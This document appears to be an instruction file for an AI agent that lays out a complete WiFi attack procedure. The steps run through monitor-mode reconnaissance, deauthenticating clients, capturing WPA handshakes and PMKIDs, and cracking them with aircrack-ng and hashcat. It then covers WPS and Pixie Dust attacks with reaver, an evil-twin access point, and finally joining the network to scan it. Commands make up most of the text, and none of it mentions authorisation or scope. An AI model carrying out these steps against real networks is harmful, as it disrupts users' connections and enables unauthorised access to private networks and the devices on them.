---
name: wireless-attack
description: Wireless network penetration testing — WiFi reconnaissance, WPA/WPA2 cracking, evil twin, deauth, rogue AP attacks
---

# Wireless Network Attack Skill

Systematic wireless network security assessment.

## CRITICAL NOTES — READ FIRST
- **Interface naming**: Many Realtek/TP-Link USB adapters (rtw88_8821au, RTL8812AU, etc.) do NOT create a `wlan0mon` interface. They stay as `wlan0` with monitor mode enabled in-place. Always check `iwconfig` output — if it says `Mode:Monitor` on `wlan0`, use `wlan0` directly.
- **5GHz captures**: Some USB adapters struggle with 5GHz injection. If captures on 5GHz keep returning 0 EAPOL data, try the 2.4GHz BSSID of the same AP instead (same password, different band).
- **Deauth flooding kills captures**: Sending too many deauth frames resets the AP's EAPOL timer and corrupts handshake captures. Use **2-5 deauth packets MAX** per burst, then wait 10+ seconds for the client to reconnect and complete the 4-way handshake.
- **hcxdumptool v7+**: Uses `-w` (not `-o`) for output file. Uses `-c 157b` for 5GHz channels (append `b` for band 5GHz).
- **airodump-ng --band abg**: Use `--band abg` to scan all bands. Do NOT pass extra `--output-format` arguments after `csv` (no `netcsv`).
- **Empty captures**: If captures are consistently empty (0 packets), the interface likely lost monitor mode. Re-run `sudo airmon-ng check kill && sudo airmon-ng start wlan0` to reset.

## Phase 1: Wireless Reconnaissance
1. Kill conflicting processes FIRST: `sudo airmon-ng check kill`
2. Find wireless interface: `iwconfig 2>/dev/null | grep -E "wlan|Mode|Frequency"`
3. Enable monitor mode: `sudo airmon-ng start wlan0`
4. Verify mode: `iwconfig 2>/dev/null` — look for `Mode:Monitor`. Note the interface name (wlan0 or wlan0mon).
5. Scan networks on ALL bands:
   ```
   sudo timeout 30 airodump-ng IFACE --band abg -w /path/to/output/scan --output-format csv 2>&1
   ```
6. Parse CSV results: `cat /path/to/output/scan-01.csv`

## Phase 2: Target Selection & Handshake Capture
**IMPORTANT**: The procedure below uses sequential steps. Do NOT run deauth and capture in the same compound command — the deauth can start before airodump locks the channel.

7. Lock airodump-ng on the target AP channel:
   ```bash
   sudo airodump-ng IFACE -c CHANNEL --bssid TARGET_BSSID -w /path/to/output/handshake --output-format pcap 2>&1 &
   DUMP_PID=$!
   sleep 5
   ```
8. Send MINIMAL deauth (2-5 packets only!):
   ```bash
   sudo aireplay-ng -0 3 -a TARGET_BSSID -c CLIENT_MAC IFACE 2>&1
   ```
9. Wait for handshake (20-40 seconds for client reconnection):
   ```bash
   sleep 30
   sudo kill $DUMP_PID 2>/dev/null
   ```
10. Verify handshake was captured:
   ```bash
    sudo aircrack-ng /path/to/output/handshake-01.cap 2>&1
   ```
   Look for `WPA (1 handshake)` — if it says `0 handshake` or `Unknown`, try again.

11. **PMKID approach** (if handshake fails after 3 attempts):
   ```bash
   sudo hcxdumptool -i IFACE -w /path/to/output/pmkid.pcapng -c CHANNELb -t 30 --rds=2 2>&1
   ```
   Then convert: `sudo hcxpcapngtool -o hash.hc22000 pmkid.pcapng`

12. **2.4GHz fallback**: If the target AP has a 2.4GHz BSSID (same SSID without "-5ghz"), try capturing the handshake from that BSSID instead — it uses the same password.

## Phase 3: Cracking
13. Convert capture to hashcat format:
    ```bash
    sudo hcxpcapngtool -o /path/to/output/hash.hc22000 /path/to/output/handshake-01.cap
    ```
14. Dictionary attack with aircrack-ng (fast, CPU-based):
    ```bash
    sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt /path/to/output/handshake-01.cap
    ```
15. Hashcat GPU attack (if GPU available):
    ```bash
    hashcat -m 22000 /path/to/output/hash.hc22000 /usr/share/wordlists/rockyou.txt
    ```
16. Rule-based attack:
    ```bash
    hashcat -m 22000 hash.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule
    ```

## Phase 4: Advanced Attacks (if cracking fails)
17. WPS PIN attack: `sudo reaver -i IFACE -b TARGET_BSSID -vv`
18. Pixie Dust: `sudo reaver -i IFACE -b TARGET_BSSID -vv -K 1`
19. Evil Twin: `sudo airbase-ng -a TARGET_BSSID --essid "TARGET_SSID" -c CHANNEL IFACE`

## Phase 5: Post-Exploitation
20. Restore managed mode: `sudo airmon-ng stop IFACE`
21. Connect: `nmcli dev wifi connect "SSID" password "PASSWORD" ifname wlan0`
22. Scan internal network with `port_scanner`
23. Save findings with `save_artifact` and `memory_store`
